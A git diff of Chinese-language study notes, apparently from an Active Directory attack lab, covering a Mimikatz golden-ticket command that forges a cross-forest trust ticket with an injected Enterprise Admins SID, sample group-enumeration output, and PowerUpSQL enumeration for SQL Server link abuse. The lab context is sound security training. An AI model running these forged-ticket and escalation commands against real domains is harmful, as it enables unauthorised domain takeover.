@@ -211,6 +211,20 @@ Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-1652071801-1423090587-98612180)
 Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:cccb3ce736c4d39039b48c79f075a430 /service:krbtgt /target:EUROCORP.LOCAL /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi"'
 ```
 
+注意上面的sids的参数是Enterprise Admins的MemberSID
+```
+PS C:\AD> Get-NetGroupMember -GroupName "Enterprise Admins" -Domain moneycorp.local
+
+
+GroupDomain  : moneycorp.local
+GroupName    : Enterprise Admins
+MemberDomain : moneycorp.local
+MemberName   : Administrator
+MemberSID    : S-1-5-21-280534878-1496970234-700767426-500
+IsGroup      : False
+MemberDN     : CN=Administrator,CN=Users,DC=moneycorp,DC=local
+```
+
 制作一张可以访问EUROCORP.LOCAL的TGS
 
 ```
@@ -248,7 +262,7 @@ SQL Servers为横向移动提供了非常好的选项，因为域用户可以映
 数据库链接允许 SQL Server 访问外部数据源，如其他SQL Server和OLE DB 数据源
 如果数据库链接在 SQL 服务器之间，也就是链接的SQL 服务器，则可以执行存储过程，数据库链接甚至可以对跨林信任有效
 
-枚举当前账号（student366）是否对MSSQLSERVER有权限，收集信息
+枚举当前账号（student366）是否对MSSQLSERVER有权限，收集信息（如果枚举不出来，重启一下VM）
 ```
 PS C:\ad\PowerUpSQL-master> Import-Module .\PowerUpSQL.psd1
 WARNING: The names of some imported commands from the module 'PowerUpSQL' include unapproved verbs that might make them
